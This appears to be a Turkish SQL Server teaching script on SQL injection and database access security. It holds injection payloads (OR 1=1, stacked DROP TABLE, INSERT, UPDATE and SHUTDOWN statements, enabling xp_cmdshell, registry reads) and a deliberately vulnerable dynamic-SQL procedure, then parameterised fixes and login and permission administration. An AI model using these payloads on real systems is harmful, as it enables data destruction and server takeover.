

--	SQL Injection Kullanýmý


SELECT * FROM Production.Product WHERE ProductID = 1;

SELECT * FROM Production.Product WHERE ProductID = 1 OR 1=1;


www.dijibil.com/index.aspx?userID=1;

www.dijibil.com/index.aspx?userID=1' OR 1=1;--

SELECT * FROM Kullanicilar WHERE Email = 'cihan.ozhan@hotmail.com';

SELECT * FROM Kullanicilar WHERE Email = 'dijibil' OR 'x'='x';

SELECT KullaniciAd, Email FROM Kullanicilar
WHERE KullaniciAd = '' OR ''='' AND Sifre = '' OR ''='';


SELECT * FROM Kullanicilar
WHERE Email = 'x'; DROP TABLE Urunler; --';


SELECT * FROM Kullanicilar
WHERE Email = 'hacker@deneme.com' AND Sifre = 'merhaba123'


SELECT * FROM Kullanicilar
WHERE Email = 'x';
    INSERT INTO Kullanicilar (KullaniciID, KullaniciAd,Sifre,Email,Telefon) 
    VALUES (5, 'saldirgan','sifre11','test@test.com',01234567890);--';


SELECT * FROM Kullanicilar
WHERE Email = 'x';
      UPDATE Kullanicilar
      SET Email = 'hacked@test.com'
      WHERE Email = 'test@test.com';


SELECT * FROM Kullanicilar
WHERE KullaniciAd = 'CihanOzhan';


SELECT * FROM Kullanicilar
WHERE KullaniciAd = '\''; DROP TABLE Siparisler; --';


SELECT KullaniciAd FROM Kullanicilar WHERE KullaniciAd = ''; 
SHUTDOWN WITH NOWAIT; 
' AND Sifre='';


SELECT * FROM Kullanicilar
WHERE KullaniciAd = 'x' AND 
      KullaniciID IS NULL;
	EXEC sp_configure 'show advanced options',1;
	RECONFIGURE;
	EXEC sp_configure 'xp_cmdshell',1;
	RECONFIGURE


EXEC sp_configure 'xp_cmdshell',1;


DECLARE @IsletimSistemi VARCHAR(100)
EXECUTE xp_regread 'HKEY_LOCAL_MACHINE', 
	  'SOFTWARE\Microsoft\Windows NT\CurrentVersion', 'ProductName', 	  @IsletimSistemi OUTPUT;
PRINT @IsletimSistemi;


SELECT @@SERVERNAME AS SunucuAd, @@SERVICENAME AS ServisAd;
DECLARE @value VARCHAR(20);
DECLARE @key VARCHAR(100);
IF ISNULL(CHARINDEX('\', @@SERVERNAME, 0), 0) > 0
BEGIN
	SET @key = 'SOFTWARE\Microsoft\Microsoft SQL Server\' + @@servicename 
	+ '\MSSQLServer\SuperSocketNetLib\Tcp';
END
ELSE
BEGIN
	SET @key = 	'SOFTWARE\MICROSOFT\MSSQLSERVER\MSSQLSERVER\SUPERSOCKETNETLIB\TCP';
END
SELECT @KEY as [Key]
EXEC master..xp_regread
   @rootkey = 'HKEY_LOCAL_MACHINE',
   @key = @key,
   @value_name = 'TcpPort',
   @value = @value OUTPUT
SELECT 'Port Numarasý : ' + CAST(@value AS VARCHAR(5)) AS PortNumber;


--	Stored Procedure ile SQL Injection


CREATE PROCEDURE KullaniciDogrula
    @kullaniciAd VARCHAR(50),
    @sifre 	     VARCHAR(50)
AS
BEGIN
    DECLARE @sql NVARCHAR(500);
    SET @sql = 'SELECT * FROM Kullanicilar
                WHERE KullaniciAd = ''' + @kullaniciAd + '''
                AND Sifre = ''' + @sifre + ''' ';
    EXEC(@sql);
END;



EXEC KullaniciDogrula 'cihanozhan', 'cihan.sifre';



CREATE PROCEDURE KullaniciDogrula
    @kullaniciAd VARCHAR(50),
    @sifre 	     VARCHAR(50)
AS
BEGIN
    SELECT * FROM Kullanicilar 
    WHERE KullaniciAd = @kullaniciAd 
    AND Sifre = @sifre;
END;



ALTER PROCEDURE pr_UrunAra
  @ara VARCHAR(50)
AS
BEGIN
  DECLARE @sorgu VARCHAR(100)
  SET @sorgu = 'SELECT * FROM Production.Product 
		    WHERE Name LIKE ''%' + @ara + '%'''
  EXEC(@sorgu)
END;


EXEC pr_UrunAra 'just';


SELECT * FROM Production.Product WHERE Name LIKE '%just' or 1=1;--%';


DECLARE @ara VARCHAR(20);
SET @ara = '%just'' OR 1=1;--%';
EXEC pr_UrunAra @ara;


--	Saldýrýlara Karþý Korunma Yöntemleri


SELECT REPLACE('''SQL'' Injection','''','"');


SELECT QUOTENAME('Kullanýcý Adý');






--	Eriþim Güvenliði


--	Verilen Ýzinleri Sýnamak


SELECT * FROM sys.fn_builtin_permissions(default);


SELECT * FROM sys.fn_builtin_permissions('DATABASE');


SELECT * FROM sys.fn_builtin_permissions('CERTIFICATE');


SELECT * FROM sys.fn_builtin_permissions(default)
WHERE permission_name = 'SELECT';



--	sys ve INFORMATION_SCHEMA Kullanýcýlarý


SELECT * FROM INFORMATION_SCHEMA.CHECK_CONSTRAINTS;


INFORMATION_SCHEMA.CHECK_CONSTRAINTS
INFORMATION_SCHEMA.COLUMN_DOMAIN_USAGE
INFORMATION_SCHEMA.COLUMN_PRIVILEGES
INFORMATION_SCHEMA.COLUMNS
INFORMATION_SCHEMA.CONSTRAINT_COLUMN_USAGE
INFORMATION_SCHEMA.CONSTRAINT_TABLE_USAGE
INFORMATION_SCHEMA.DOMAIN_CONSTRAINTS
INFORMATION_SCHEMA.DOMAINS
INFORMATION_SCHEMA.KEY_COLUMN_USAGE
INFORMATION_SCHEMA.PARAMETERS
INFORMATION_SCHEMA.REFERENTIAL_CONSTRAINTS
INFORMATION_SCHEMA.ROUTINE_COLUMNS
INFORMATION_SCHEMA.ROUTINES
INFORMATION_SCHEMA.SCHEMATA
INFORMATION_SCHEMA.TABLE_CONSTRAINTS
INFORMATION_SCHEMA.TABLE_PRIVILEGES
INFORMATION_SCHEMA.TABLES
INFORMATION_SCHEMA.VIEW_COLUMN_USAGE
INFORMATION_SCHEMA.VIEW_TABLE_USAGE
INFORMATION_SCHEMA.VIEWS



USE AdventureWorks
GO
SELECT * FROM sys.all_columns;


--	Oturumlarý Görüntülemek ve Düzenlemek


EXEC sp_helplogins 'diji_developer';


SELECT * FROM sys.login_token;


SELECT LT.name,
       SP.type_desc
FROM sys.login_token LT
     JOIN sys.server_principals SP
     ON LT.sid = SP.sid
WHERE 
	SP.type_desc = 'WINDOWS_LOGIN';



--	SQL Oturumlarý Oluþturmak


CREATE LOGIN gelistirici WITH PASSWORD = '.._1=9(+%^+%dijibil';


CREATE LOGIN gelistirici WITH PASSWORD = '.._1=9(+%^+%dijibil', 
	CREDENTIAL = DijibilCN;


CREATE LOGIN gelistirici FROM WINDOWS;


--	Oturumlarý T-SQL ile Düzenlemek


ALTER LOGIN gelistirici WITH NAME = diji_developer;

ALTER LOGIN diji_developer WITH PASSWORD = 'yeni_sifre-1().,+%11';

ALTER LOGIN diji_developer MUST_CHANGE;

ALTER LOGIN diji_developer CHECK_POLICY = ON;

ALTER LOGIN diji_developer CHECK_EXPIRATION = ON;


--	Sunucu Eriþimi Vermek ya da Kaldýrmak


GRANT CONNECT SQL TO diji_developer;

DENY CONNECT SQL TO diji_developer;


--	Oturumlarý Etkinleþtirmek, Devre Dýþý Býrakmak ve Kilidini Kaldýrmak


ALTER LOGIN diji_developer DISABLE;


ALTER LOGIN diji_developer ENABLE;


ALTER LOGIN diji_developer WITH PASSWORD = '123456' UNLOCK;


--	Þifreleri Deðiþtirmek


ALTER LOGIN diji_developer WITH PASSWORD = 'yeni_sifre11-2&5%';


ALTER LOGIN diji_developer MUST_CHANGE;


--	Oturumlarý Kaldýrmak


DROP LOGIN diji_developer;


--	Ýfade Ýzinleri


GRANT SELECT
ON Production.Product
TO AWtest;


GRANT CREATE TABLE
TO AWtest;


GRANT INSERT, UPDATE, DELETE
ON Production.Product
TO AWtest;


REVOKE SELECT
ON Production.Product
TO AWtest;


REVOKE CREATE TABLE
TO AWtest;


REVOKE INSERT, UPDATE, DELETE
ON Production.Product
TO AWtest;


DENY SELECT
ON Production.Product
TO AWtest;


DENY CREATE TABLE
TO AWtest;


DENY INSERT, UPDATE, DELETE
ON Production.Product
TO AWtest;


--	Oturum ile Rolleri Atamak

EXEC sp_addsrvrolemember diji_developer, sysadmin;


EXEC sp_dropsrvrolemember diji_developer, sysadmin;














































































